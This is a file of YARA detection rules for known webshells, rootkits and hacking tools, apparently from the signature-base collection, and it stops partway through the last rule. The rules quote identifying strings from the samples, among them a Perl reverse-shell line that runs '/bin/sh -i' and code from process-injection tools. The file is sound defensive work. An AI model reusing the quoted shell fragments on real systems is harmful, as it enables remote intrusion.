rule SIGNATURE_BASE_FSO_S_Remexp_1
{
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "48a262bf-7f48-5ed9-b043-80e9d563bf21"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7960-L7973"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "b9b966a89ab097494d7af90775bf124f1310c77145be67fa57ebdacd0164e3d0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
		$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
		$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Tool_1
{
	meta:
		description = "Webshells Auto-generated - file tool.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ed744aa4-7a35-57d6-89bd-3286a21b50a0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7974-L7985"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3a1e1e889fdd974a130a6a767b42655b"
		logic_hash = "a3449aca3124aa4d920d78e5e674ddd9d8a181b0ce0143032352a69dfdbcad2d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "\"\"%windir%\\\\calc.exe\"\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_2005_1
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "91d278d5-e9ec-5a28-9a54-4549b4f0cd07"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7986-L7998"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "97f2552c2fafc0b2eb467ee29cc803c8"
		logic_hash = "4d04174b23c9057acf2618c01cd702eaaec2d3508a8c25dd87fdd320c076a3b1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
		$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byloader_1
{
	meta:
		description = "Webshells Auto-generated - file byloader.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24940e4b-06eb-548d-9e14-1a8f9c864bd3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7999-L8014"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0f0d6dc26055653f5844ded906ce52df"
		logic_hash = "66c900e4bc771fb23d7623e57ad51edaa95696c2e31554720582f3e33a1b2e25"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "NTFS Disk Driver Checking Service"
		$s3 = "Dumping Description to Registry..."
		$s4 = "Opening Service .... Failure !"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Fport_1
{
	meta:
		description = "Webshells Auto-generated - file Fport.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "664e7b19-4d0b-5062-97d2-0eb34869024d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8015-L8027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dbb75488aa2fa22ba6950aead1ef30d5"
		logic_hash = "b9dc66e249c0577839cc3748f129c343d2ccb7327b92a2a67e4467782d10a25e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "Copyright 2000 by Foundstone, Inc."
		$s5 = "You must have administrator privileges to run fport - exiting..."

	condition:
		all of them
}

rule SIGNATURE_BASE_Backdoor__Fr__1
{
	meta:
		description = "Webshells Auto-generated - file BackDooR (fr).php"
		author = "Florian Roth (Nextron Systems)"
		id = "fd0c77e8-18b7-5eb4-8ed4-87ee4c864683"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8028-L8039"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a79cac2cf86e073a832aaf29a664f4be"
		logic_hash = "6c16c200712015eed71aeb119e46bad5f93445a8f719d98ef31f9012cb3551ae"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ntdaddy_1
{
	meta:
		description = "Webshells Auto-generated - file ntdaddy.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "b6b655b8-7bce-5fa5-97b7-a020a7e53f4f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8040-L8051"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"
		logic_hash = "4df6f53ee9bfc0214e69dd858878026e962b90573ed48a5ffdd5523538e8f3bf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"

	condition:
		all of them
}

rule SIGNATURE_BASE_Nstview_Nstview_1
{
	meta:
		description = "Webshells Auto-generated - file nstview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00df601c-bddb-5da8-bef4-d2122419b5d0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8052-L8063"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3871888a0c1ac4270104918231029a56"
		logic_hash = "2b25e22d86a672af0b8957f1b0336ed80e09f3389f5045c230af2372db0e3415"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Upload_1
{
	meta:
		description = "Webshells Auto-generated - file upload.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "43054993-b0dd-5d2e-9890-db1f47759be5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8064-L8075"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b09852bda534627949f0259828c967de"
		logic_hash = "312020a72a37adb0111ac6d61810c8e476be39dc6456e80e83cd6a680e8ea051"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageUpload Below -->"

	condition:
		all of them
}

rule SIGNATURE_BASE_Passwordreminder_1
{
	meta:
		description = "Webshells Auto-generated - file PasswordReminder.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "642033ee-4454-5913-8348-4d1579fc0bd8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8076-L8087"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"
		logic_hash = "f3da5381f5e352c541654d2af918ca8cea8049d137078670dd0538a4d13f676e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."

	condition:
		all of them
}

rule SIGNATURE_BASE_Pack_Injectt_1
{
	meta:
		description = "Webshells Auto-generated - file InjectT.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3a640c22-0cd4-5ab1-9216-c68625d7d505"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8088-L8103"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "983b74ccd57f6195a0584cdfb27d55e8"
		logic_hash = "9f66b7b429ed585888c0fb4943bb12262247b3af8d85bc67309b27752171e66a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ail To Open Registry"
		$s4 = "32fDssignim"
		$s5 = "vide Internet S"
		$s6 = "d]Software\\M"
		$s7 = "TInject.Dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remexp_2_1
{
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "501544d5-fe52-5933-8782-516ffe18f3ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8104-L8116"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "e31e25a7c2b2e970a379a61d2dac335bd37cac48328eee9f3966ff5c77ef6f18"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = " Then Response.Write \""
		$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_C99_1
{
	meta:
		description = "Webshells Auto-generated - file c99.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b176370-a5ab-587a-b0e9-ef4fe5c604bd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8117-L8128"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5f9ba02eb081bba2b2434c603af454d0"
		logic_hash = "de769299bbd8b895b84db757fcc037b807f7caaa624c06e9d330934a968b2381"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rknt_Zip_Folder_Rknt_1
{
	meta:
		description = "Webshells Auto-generated - file RkNT.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "a58a3b33-8096-535a-b930-2eb71347edb8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8129-L8146"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5f97386dfde148942b7584aeb6512b85"
		logic_hash = "59de8a40a7081ee5fbea9f413590237c1da9985f2352b32571529baf38c93ddb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "PathStripPathA"
		$s1 = "`cLGet!Addr%"
		$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s3 = "oQToOemBuff* <="
		$s4 = "ionCdunAsw[Us'"
		$s6 = "CreateProcessW: %S"
		$s7 = "ImageDirectoryEntryToData"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dbgntboot_1
{
	meta:
		description = "Webshells Auto-generated - file dbgntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "6b9381e6-597d-5e74-a318-9931d20a9d08"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8147-L8159"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4d87543d4d7f73c1529c9f8066b475ab"
		logic_hash = "10f86f18aff4995928efb3c8000eca166fe37e6006de7938139cad718ff7653f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
		$s3 = "sth junk the M$ Wind0wZ retur"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Shell_1
{
	meta:
		description = "Webshells Auto-generated - file shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8160-L8172"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "45e8a00567f8a34ab1cccc86b4bc74b9"
		logic_hash = "a62061b2fa851f5798158198e26f188408f3f37dca69a85ca155777c0b8407ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
		$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hxdef100_1
{
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fb376c18-02d2-5866-a0e2-ccb5262091dd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8173-L8186"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "55cc1769cef44910bd91b7b73dee1f6c"
		logic_hash = "a2002dcddad7ffdbe9614723163016f9357347bb704640d3933ce4513c37d474"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RtlAnsiStringToUnicodeString"
		$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
		$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rdrbs100_1
{
	meta:
		description = "Webshells Auto-generated - file rdrbs100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "369e5ce0-984c-54eb-96d4-fbfb4f932ba6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8187-L8199"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7c752bcd6da796d80a6830c61a632bff"
		logic_hash = "8a427ef9e0ecd0c810913203aaef43647964f33658dfdca8195fce6f0545f8f4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "Server address must be IP in A.B.C.D format."
		$s4 = " mapped ports in the list. Currently "

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_Mithril_1
{
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "81645f57-7d7e-5b4d-b323-744f2cde4916"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8200-L8218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "017191562d72ab0ca551eb89256650bd"
		logic_hash = "5d19eb4132a0401d226c9cffc927b2838e9c69428746296b55a488d097759587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "OpenProcess error!"
		$s1 = "WriteProcessMemory error!"
		$s4 = "GetProcAddress error!"
		$s5 = "HHt`HHt\\"
		$s6 = "Cmaudi0"
		$s7 = "CreateRemoteThread error!"
		$s8 = "Kernel32"
		$s9 = "VirtualAllocEx error!"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hxdef100_2_1
{
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1f079b73-29de-50cf-868c-1639a43e576f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8219-L8232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1b393e2e13b9c57fb501b7cd7ad96b25"
		logic_hash = "d44131f6c1bfdc36079f474832a79a361dfad96d1b84f7004d682150c93eccc5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
		$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
		$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webadmin_1
{
	meta:
		description = "Webshells Auto-generated - file webadmin.php"
		author = "Florian Roth (Nextron Systems)"
		id = "615d87f8-9094-5994-aea1-d7276623fbca"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8254-L8265"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3a90de401b30e5b590362ba2dde30937"
		logic_hash = "6e215c3d8b8357b839416ee6951f7739387bb94aa1284ea7e827ae2205221294"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"

	condition:
		all of them
}

rule SIGNATURE_BASE_Commands_1
{
	meta:
		description = "Webshells Auto-generated - file commands.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7cffefc7-4f24-5908-82a4-f11eda398377"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8266-L8278"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "174486fe844cb388e2ae3494ac2d1ec2"
		logic_hash = "5251ee090934c8f99a8a2ffef2605593943306937dc56a135a47f1da7e732587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
		$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkdoordll_1
{
	meta:
		description = "Webshells Auto-generated - file hkdoordll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "c4cfb575-89c3-5a72-8bf5-234d4284fe9d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8279-L8290"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b715c009d47686c0e62d0981efce2552"
		logic_hash = "a3c4d262b59cdf82390c0457810505e9e7a18c9b26ba4524bc368fd2141ec306"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_2_1
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3a3fe11-c9e1-523b-88a3-ddc0c1085d04"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8291-L8302"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "5319426928d33b62527efb561c2b7a226a5a473735f501b267e6b3b174972085"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dbgiis6Cli_1
{
	meta:
		description = "Webshells Auto-generated - file dbgiis6cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "2bc59a6b-f45c-5e68-a346-ac56e8f2757b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8317-L8329"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3044dceb632b636563f66fee3aaaf8f3"
		logic_hash = "f6de3c9b8fbcca230540d1b41659ab02c9548df69f53fa9d5730ac7bb7dfe88a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
		$s5 = "###command:(NO more than 100 bytes!)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Remview_2003_04_22_1
{
	meta:
		description = "Webshells Auto-generated - file remview_2003_04_22.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3088ee27-42a3-5140-98de-ab6f87c7748b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8330-L8341"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17d3e4e39fbca857344a7650f7ea55e3"
		logic_hash = "2957f6ec7a022ac04759724276f6928625708346903597b0765b5e81207fc6b9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""

	condition:
		all of them
}

rule SIGNATURE_BASE_Debug_Cress_1
{
	meta:
		description = "Webshells Auto-generated - file cress.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6cf3e43c-bec1-5688-b1d7-8ac48d59153a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8355-L8367"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "36a416186fe010574c9be68002a7286a"
		logic_hash = "670e236e72d3cb52ea5dba865749baee58a70f8d100db1dd8eddfe3183339181"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\Mithril "
		$s4 = "Mithril.exe"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_1
{
	meta:
		description = "Webshells Auto-generated - file webshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8368-L8383"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f2f8c02921f29368234bfb4d4622ad19"
		logic_hash = "e3fdce426d2f6e88d8e9412a3026ea05d027af934763eafe0188602458c2289d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RhViRYOzz"
		$s1 = "d\\O!jWW"
		$s2 = "bc!jWW"
		$s3 = "0W[&{l"
		$s4 = "[INhQ@\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_EFSO_2_1
{
	meta:
		description = "Webshells Auto-generated - file EFSO_2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e88d324c-1dee-5b07-b528-cf760e3ee7a6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
